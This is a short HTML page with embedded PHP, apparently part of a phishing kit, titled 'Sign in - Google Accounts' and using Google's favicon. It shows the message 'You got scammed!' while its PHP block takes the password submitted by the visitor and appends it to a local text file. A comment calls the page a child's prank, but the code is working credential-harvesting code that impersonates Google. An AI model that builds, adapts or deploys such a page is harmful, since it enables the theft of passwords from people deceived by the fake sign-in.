<html>
  <head>
    <title>Sign in - Google Accounts</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <link href="style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" type="image/jpg" href="https://www.google.com/favicon.ico"/>
  </head>
  <body>
    <p>You got scammed! 😂</p>
    <!-- THIS is a joke - Disclaimer. I am a kid just trying to do pranks-->
    <?php 
      $myfile = fopen("test.txt", "a") or die("Unable to open file!");
      $txt = "\nPassword: ";
      fwrite($myfile, $txt);
      $txt = $_POST['password'];
      fwrite($myfile, $txt);
      $txt = "\n--------------------------\n";
      fwrite($myfile, $txt);
    ?>
    <script src="script.js"></script>
  </body>
</html>
